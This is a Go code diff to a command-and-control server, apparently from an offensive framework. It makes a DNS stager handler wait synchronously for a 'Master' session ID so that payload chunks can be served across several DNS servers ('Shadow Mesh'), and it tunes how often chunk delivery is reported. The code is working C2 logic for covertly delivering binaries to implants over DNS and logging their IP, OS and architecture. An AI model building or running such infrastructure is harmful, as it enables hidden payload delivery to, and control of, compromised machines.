@@ -1489,58 +1489,46 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 				var clientBinaryID string
 				var chunkCount int
 				if err := rows.Scan(&clientBinaryID, &chunkCount); err == nil && chunkCount > 0 {
-					// We have cached chunks! Generate session locally and respond immediately
-					// Use 4-char random ID to keep DNS packet size under 512 bytes
-					sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
-
+					// We have cached chunks! Report to Master and wait for session ID
+					// IMPORTANT: Must use Master's session ID for Shadow Mesh cross-server compatibility
 					if !isDuplicate {
 						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
 					}
 
-					// Report stager contact to Master and get Master-assigned session ID
-					// This allows Master to track the session in its UI
-					masterSessionID := ""
-					reportErr := error(nil)
-					go func() {
-						var err error
-						masterSessionID, err = masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
-						if err != nil {
-							logf("[C2] Warning: Failed to report stager contact to Master: %v", err)
-						} else if masterSessionID != "" {
-							logf("[C2] Master assigned session ID: %s", masterSessionID)
-							// Update our local session with Master's ID
-							c2.mutex.Lock()
-							if session, ok := c2.cachedStagerSessions[sessionID]; ok {
-								session.MasterSessionID = masterSessionID
-							}
-							c2.mutex.Unlock()
-						}
-						reportErr = err
-					}()
-
-					// Wait briefly for Master to respond with session ID (max 500ms)
-					// This ensures progress reports use the correct session ID
-					time.Sleep(500 * time.Millisecond)
-					if reportErr == nil && masterSessionID != "" {
-						// Use Master's session ID for this stager
-						sessionID = masterSessionID
+					// Report stager contact to Master and get Master-assigned session ID (SYNCHRONOUS)
+					// This is critical for Shadow Mesh: stager may request chunks from different DNS servers
+					masterSessionID, err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
+					if err != nil {
+						logf("[C2] ⚠️  Failed to report stager contact to Master: %v", err)
+						// Without Master session ID, cross-server requests will fail
+						// Return error to force stager to retry (maybe with different server)
+						return "ERROR|MASTER_UNAVAILABLE"
 					}
+
+					if masterSessionID == "" {
+						logf("[C2] ⚠️  Master returned empty session ID")
+						return "ERROR|SESSION_CREATION_FAILED"
+					}
+
+					logf("[C2] Master assigned session ID: %s (will work across all DNS servers)", masterSessionID)
 
 					// Store session info locally for tracking
 					c2.mutex.Lock()
 					if c2.cachedStagerSessions == nil {
 						c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
 					}
-					c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
-						SessionID:       sessionID,
+					c2.cachedStagerSessions[masterSessionID] = &CachedStagerSession{
+						SessionID:       masterSessionID,
 						MasterSessionID: masterSessionID,
 						ClientBinaryID:  clientBinaryID,
 						StagerIP:        stagerIP,
 						TotalChunks:     chunkCount,
 						CreatedAt:       time.Now(),
 					}
-					c2.mutex.Unlock() // Return META immediately (no Master roundtrip!)
-					metaResponse := fmt.Sprintf("META|%s|%d", sessionID, chunkCount)
+					c2.mutex.Unlock()
+
+					// Return META with Master's session ID (guaranteed to work on all DNS servers)
+					metaResponse := fmt.Sprintf("META|%s|%d", masterSessionID, chunkCount)
 					if !isDuplicate {
 						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
 					}
@@ -1729,14 +1717,14 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 				// Report chunk delivery to Master (async, with smart batching)
 				// Report frequently at start, then batch, then frequently at end
 				shouldReport := false
-				if chunkIndex < 10 {
-					// Report first 10 chunks individually for immediate feedback
+				if chunkIndex < 20 {
+					// Report first 20 chunks individually for immediate feedback
 					shouldReport = true
-				} else if chunkIndex >= cachedSession.TotalChunks-10 {
-					// Report last 10 chunks individually for accurate completion
+				} else if chunkIndex >= cachedSession.TotalChunks-20 {
+					// Report last 20 chunks individually for accurate completion
 					shouldReport = true
-				} else if chunkIndex%50 == 0 {
-					// Report every 50th chunk in the middle
+				} else if chunkIndex%10 == 0 {
+					// Report every 10th chunk in the middle (was 50)
 					shouldReport = true
 				}
 
